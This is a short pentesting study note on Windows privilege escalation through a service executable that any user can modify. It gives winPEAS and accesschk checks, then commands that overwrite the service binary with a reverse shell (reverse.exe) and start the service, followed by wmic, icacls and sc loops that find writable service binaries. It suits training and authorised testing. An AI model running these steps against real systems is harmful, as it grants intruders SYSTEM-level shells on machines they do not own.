If the original service executable is modifiable by our  
user, we can simply replace it with our reverse shell  
executable.  
Remember to create a backup of the original executable  
if you are exploiting this in a real system!

1.Run winPEAS to check for service misconfigurations:  
`.\winPEASany.exe quiet servicesinfo`

> 2.Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe:
> 
> > File Permissions: Everyone [AllAccess]

`> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`

3.Create a backup of the original service executable:  
`copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp`

4.Copy the reverse shell executable to overwrite the service executable:  
`copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"`

5.Start a listener on Kali, and then start the service to trigger the exploit:  
`net start filepermsvc`

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](app://obsidian.md/dll-hijacking/))**.**  
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

You can also use **sc** and **icacls**:

```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```